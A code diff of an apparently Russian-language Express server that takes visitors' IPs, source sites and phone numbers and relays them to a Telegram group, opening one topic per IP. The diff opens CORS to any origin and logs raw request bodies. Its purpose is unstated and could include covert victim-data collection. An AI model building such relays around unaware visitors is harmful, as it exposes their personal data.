@@ -2,7 +2,13 @@ const express = require('express');
 const cors = require('cors');
 const app = express();
 
-app.use(cors({ origin: '*', methods: ['GET', 'POST', 'OPTIONS'], allowedHeaders: ['Content-Type'] }));
+// Настройки CORS - разрешаем всё
+app.use(cors({
+    origin: '*',
+    methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
+    allowedHeaders: ['Content-Type', 'Authorization']
+}));
+
 app.options('*', cors());
 app.use(express.json({ limit: '50mb' }));
 
@@ -23,25 +29,20 @@ async function callTelegram(method, params) {
     return response.json();
 }
 
-// Обновление иконки и названия топика
 async function updateTopicInfo(ip, topicId, site) {
     const status = ipStatus.get(ip);
     if (!status) return;
-    
     const iconEmoji = status.online ? '🟢' : '⚫️';
     const shortSite = site?.replace(/^https?:\/\//, '').replace(/\/$/, '').substring(0, 30) || 'unknown';
-    
     try {
         await callTelegram('editForumTopic', {
             chat_id: GROUP_CHAT_ID,
             message_thread_id: topicId,
-            name: `${iconEmoji} ${shortSite}`,
-            icon_custom_emoji_id: null
+            name: `${iconEmoji} ${shortSite}`
         });
     } catch (e) { console.error('Ошибка иконки:', e.message); }
 }
 
-// Обновление закреплённого сообщения
 async function updatePinnedMessage(ip, topicId) {
     const status = ipStatus.get(ip);
     if (!status) return;
@@ -84,7 +85,6 @@ async function updatePinnedMessage(ip, topicId) {
 async function createTopicForIp(ip, site, userId, phone = null) {
     try {
         const shortSite = site?.replace(/^https?:\/\//, '').replace(/\/$/, '').substring(0, 30) || 'unknown';
-        
         const topic = await callTelegram('createForumTopic', {
             chat_id: GROUP_CHAT_ID,
             name: `🟡 ${shortSite}`
@@ -126,31 +126,41 @@ app.get('/', (req, res) => {
 });
 
 app.post('/register', async (req, res) => {
+    console.log('📞 Получен запрос на регистрацию:', req.body);
     const { userId, site, ip, phone } = req.body;
-    if (!ip || !phone) return res.status(400).json({ ok: false, error: 'ip and phone required' });
     
-    let status = ipStatus.get(ip);
-    if (!status) {
-        status = { online: true, lastActive: Date.now(), site, userId, phone, pinnedMessageId: null };
-    }
-    status.phone = phone;
-    status.userId = userId;
-    status.site = site;
-    ipStatus.set(ip, status);
-    
-    let topicId = ipTopics.get(ip);
-    if (topicId) {
-        await updatePinnedMessage(ip, topicId);
-        await updateTopicInfo(ip, topicId, site);
-        await callTelegram('sendMessage', {
-            chat_id: GROUP_CHAT_ID,
-            message_thread_id: topicId,
-            text: `📞 **Пользователь указал номер телефона:** ${phone}`,
-            parse_mode: 'Markdown'
-        });
+    if (!ip || !phone) {
+        return res.status(400).json({ ok: false, error: 'ip and phone required' });
     }
     
-    res.json({ ok: true });
+    try {
+        let status = ipStatus.get(ip);
+        if (!status) {
+            status = { online: true, lastActive: Date.now(), site, userId, phone, pinnedMessageId: null };
+        }
+        status.phone = phone;
+        status.userId = userId;
+        status.site = site;
+        ipStatus.set(ip, status);
+        
+        let topicId = ipTopics.get(ip);
+        if (topicId) {
+            await updatePinnedMessage(ip, topicId);
+            await updateTopicInfo(ip, topicId, site);
+            await callTelegram('sendMessage', {
+                chat_id: GROUP_CHAT_ID,
+                message_thread_id: topicId,
+                text: `📞 **Пользователь указал номер телефона:** ${phone}`,
+                parse_mode: 'Markdown'
+            });
+        }
+        
+        console.log('✅ Регистрация успешна для IP:', ip);
+        res.json({ ok: true });
+    } catch (error) {
+        console.error('Ошибка регистрации:', error);
+        res.status(500).json({ ok: false, error: error.message });
+    }
 });
 
 app.post('/send', async (req, res) => {
